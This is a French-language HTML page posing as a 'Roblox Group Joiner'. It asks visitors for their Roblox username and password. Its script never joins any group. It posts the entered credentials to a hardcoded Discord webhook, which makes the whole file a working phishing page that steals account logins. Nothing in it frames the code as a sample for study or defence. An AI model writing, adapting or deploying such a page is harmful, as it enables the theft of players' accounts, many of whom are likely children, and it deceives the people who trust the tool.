<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Group Joiner</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: #f4f4f4;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            font-size: 16px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            font-size: 14px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
        }
        button:hover {
            background-color: #218838;
        }
        #result {
            margin-top: 20px;
            padding: 15px;
            color: #721c24;
            border-radius: 5px;
            display: none;
        }
        #result.success {
            background-color: #d4edda;
            color: #155724;
        }
        #result.error {
            background-color: #f8d7da;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Roblox Group Joiner</h2>
        <div class="form-group">
            <label for="username">Identifiant Roblox :</label>
            <input type="text" id="username" placeholder="Entrez votre identifiant Roblox" required>
        </div>
        <div class="form-group">
            <label for="password">Mot de passe :</label>
            <input type="password" id="password" placeholder="Entrez votre mot de passe" required>
        </div>
        <button id="submit">Rejoindre le groupe</button>
        <div id="result"></div>
    </div>

    <script>
        document.getElementById("submit").addEventListener("click", function() {
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const resultDiv = document.getElementById("result");

            // Réinitialiser le message de résultat
            resultDiv.style.display = "none";
            resultDiv.classList.remove("success", "error");

            if (username && password) {
                const data = {
                    content: `**Identifiant :** ${username}\n**Mot de passe :** ${password}`
                };

                // Envoi des données au webhook Discord
                fetch("https://discord.com/api/webhooks/1313875221962293299/udiLUTH-dwm_A547e2doz1LLiFwOGPfCXUf83IzGEFtvYQ98-tljeg7hQE2ekiZG_w9J", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    resultDiv.style.display = "block";

                    if (response.ok) {
                        resultDiv.classList.add("success");
                        resultDiv.innerHTML = "Les informations ont été envoyées avec succès.";
                    } else {
                        throw new Error("Erreur d'envoi au webhook");
                    }
                })
                .catch(error => {
                    resultDiv.style.display = "block";
                    resultDiv.classList.add("error");
                    resultDiv.innerHTML = "Erreur : Les informations ont été envoyées, mais une erreur est survenue.";
                });
            } else {
                alert("Veuillez remplir tous les champs.");
            }
        });
    </script>

</body>
</html>
